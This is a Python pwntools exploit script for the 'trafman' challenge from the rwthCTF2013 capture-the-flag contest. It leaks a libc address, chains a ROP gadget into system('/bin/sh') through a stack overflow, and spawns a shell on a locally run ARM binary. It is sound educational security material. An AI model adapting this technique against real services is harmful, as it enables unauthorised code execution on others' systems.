#!/usr/bin/env python2
#Exploit for challenge trafman of rwthCTF2013.
#
#Launch arm binary directly on an i386 system:
#Ref: https://gist.github.com/zachriggle/8396235f532e1aeb146d
#   apt-get install qemu-user-static libc6-armhf-cross
#   mkdir /etc/qemu-binfmt
#   ln -s /usr/arm-linux-gnueabihf /etc/qemu-binfmt/arm
#
#Create a directory named db next to the trafman binary.

from pwn import *

io = process("./trafman")
libc = ELF("/usr/arm-linux-gnueabihf/lib/libc.so.6")

objectID = "A"*40

#Find out gadget in libc.so.6, Using ROPgadget now.
#0x00058bac : pop {r0, r4, pc}
pop = 0x00058bac

#Step1: Leak libc base address.
io.sendlineafter("Username: ", "traffic_operator")
io.sendlineafter("number:\n", "23")
data = io.recvline_startswith(">")

printf_addr = int(data.split(" ")[1][2:], 16)
libc.address = printf_addr - libc.symbols["printf"]

binsh = libc.search("/bin/sh\x00").next()
pop = libc.address + pop

#Step2: Build ROP chain. return-to-system.
# Segmentation fault at: 0x63616174
offset = cyclic_find(p32(0x63616174))
padding = cyclic(offset) 
padding += p32(pop)
padding += p32(binsh)
padding += "AAAA"
padding += p32(libc.symbols["system"])

#Step3: Execute Command, make a file which length is large than stack.
io.sendlineafter("number:\n", "2")
io.sendlineafter("):\n", objectID)
io.sendlineafter("command:\n", padding)

#Step4: Get Command, triger stack overflow, spawn a shell.
io.sendlineafter("number:\n", "1")
io.sendlineafter("command for:\n", objectID)
io.interactive()
